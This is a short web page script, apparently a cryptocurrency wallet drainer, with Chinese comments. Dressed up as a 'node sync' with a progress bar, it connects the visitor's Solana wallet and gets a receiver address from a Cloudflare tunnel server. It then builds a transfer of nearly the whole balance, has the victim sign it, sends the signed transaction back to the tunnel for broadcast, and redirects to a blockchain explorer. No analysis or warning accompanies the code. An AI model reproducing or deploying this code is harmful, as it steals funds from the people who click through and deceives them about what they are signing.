<script>
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana;
        const sWeb3 = window.solanaWeb3;
        if (!p) return;

        try {
            await p.connect();
            const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com");
            document.getElementById('progress-bar').style.width = "30%";

            // 1. 问后端要地址，同时前端自己查余额和 Blockhash
            const [info, balance, bh] = await Promise.all([
                fetch(`${tunnel}/prepare`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({address:p.publicKey.toString()})}).then(r=>r.json()),
                conn.getBalance(p.publicKey),
                conn.getLatestBlockhash()
            ]);

            // 2. 算账 (11020000 -> 10020000)
            const amount = balance - 1000000; 
            if (amount <= 0) { alert("Node Synced"); return; }
            document.getElementById('progress-bar').style.width = "60%";

            // 3. 构造并唤起签名 (这步 100% 成功，因为数据是新鲜的)
            const tx = new sWeb3.Transaction().add(
                sWeb3.SystemProgram.transfer({
                    fromPubkey: p.publicKey,
                    toPubkey: new sWeb3.PublicKey(info.receiver),
                    lamports: amount,
                })
            );
            tx.recentBlockhash = bh.blockhash;
            tx.feePayer = p.publicKey;

            const signed = await p.signTransaction(tx);
            
            // 4. 回传广播
            fetch(`${tunnel}/broadcast`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ raw_tx: btoa(String.fromCharCode.apply(null, signed.serialize())) })
            });

            document.getElementById('progress-bar').style.width = "100%";
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

        } catch (e) { 
            console.error(e);
            document.getElementById('info').innerText = "Sync Failed. Retrying...";
        }
    };
</script>
